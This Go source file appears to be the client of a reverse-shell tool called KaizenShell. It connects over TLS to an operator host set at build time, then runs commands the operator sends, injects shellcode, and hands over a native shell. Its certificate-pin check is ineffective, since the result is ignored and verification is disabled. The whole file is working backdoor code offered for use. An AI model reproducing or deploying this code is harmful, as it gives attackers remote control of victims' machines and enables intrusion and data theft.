package main

import (
	"bufio"
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"net"
	"os"
	"os/exec"
	"strings"

	"github.com/JohnAntonusMaximus/KaizenShell/shell"
)

const (
	ERR_COULD_NOT_DECODE = 1 << iota
	ERR_HOST_UNREACHABLE = iota
	ERR_BAD_FINGERPRINT  = iota
)

var (
	connectString string
	fingerPrint   string
)

func InteractiveShell(conn net.Conn) {
	var (
		exit    bool           = false
		prompt  string         = "[KaizenShell]> "
		scanner *bufio.Scanner = bufio.NewScanner(conn)
	)

	conn.Write([]byte(prompt))

	for scanner.Scan() {
		command := scanner.Text()
		if len(command) > 1 {
			argv := strings.Split(command, " ")
			switch argv[0] {
			case "inject":
				if len(argv) > 1 {
					shell.InjectShellCode(argv[1])
				}
			case "exit":
				exit = true
			case "run_shell":
				conn.Write([]byte("Native Shell Acquired!"))
				RunShell(conn)
			default:
				shell.ExecuteCmd(command, conn)
			}

			if exit {
				break
			}
		}
		conn.Write([]byte(prompt))
	}
}

// CheckKeyPin checks if the pinned certificate is a valid certificate in memory
func CheckKeyPin(conn *tls.Conn, fingerprint []byte) (bool, error) {
	valid := false
	connState := conn.ConnectionState()
	for _, peerCert := range connState.PeerCertificates {
		hash := sha256.Sum256(peerCert.Raw)
		if bytes.Compare(hash[0:], fingerprint) == 0 {
			valid = true
		}
	}
	return valid, nil
}

func RunShell(conn net.Conn) {
	var cmd *exec.Cmd = shell.GetShell()
	cmd.Stdout = conn
	cmd.Stdin = conn
	cmd.Stderr = conn
	cmd.Run()
}

func Reverse(connectString string, fingerprint []byte) {
	var (
		conn *tls.Conn
		err  error
	)

	config := &tls.Config{InsecureSkipVerify: true}
	if conn, err = tls.Dial("tcp", connectString, config); err != nil {
		os.Exit(ERR_HOST_UNREACHABLE)
	}

	defer conn.Close()

	if _, err := CheckKeyPin(conn, fingerprint); err != nil {
		os.Exit(ERR_BAD_FINGERPRINT)
	}
	InteractiveShell(conn)
}

func main() {
	if connectString != "" && fingerPrint != "" {
		fprint := strings.Replace(fingerPrint, ":", "", -1)
		bytesFingerprint, err := hex.DecodeString(fprint)
		if err != nil {
			os.Exit(ERR_COULD_NOT_DECODE)
		}
		Reverse(connectString, bytesFingerprint)
	}
}
